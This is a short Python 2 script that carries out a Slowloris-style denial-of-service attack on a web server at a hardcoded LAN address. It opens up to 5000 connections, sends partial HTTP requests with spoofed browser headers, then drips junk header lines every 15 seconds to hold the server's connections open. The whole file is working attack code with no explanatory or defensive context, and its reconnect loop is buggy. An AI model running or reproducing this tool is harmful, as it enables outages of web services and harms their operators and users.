import socket, sys, time, random

sockets = []

headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Accept-language: en-US,en,q=0.5"
]

ip = "192.168.1.253"
numsocks = 5000

for i in range(numsocks):
    try:
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(4)
        sk.connect((ip, 80))
        sockets.append(sk)
    except socket.error:
        break

print "All socked out ;)"

for s in sockets:
    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    for header in headers:
        s.send(bytes("{}\r\n".format(header).encode("utf-8")))

while True:
    for s in sockets:
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
        except socket.error:
            sockets.remove(s)
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((ip, 80))
                for s in sockets:
                    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                    for header in headers:
                        s.send(bytes("{}\r\n".format(header).encode("utf-8")))
            except socket.error:
                continue

    time.sleep(15)
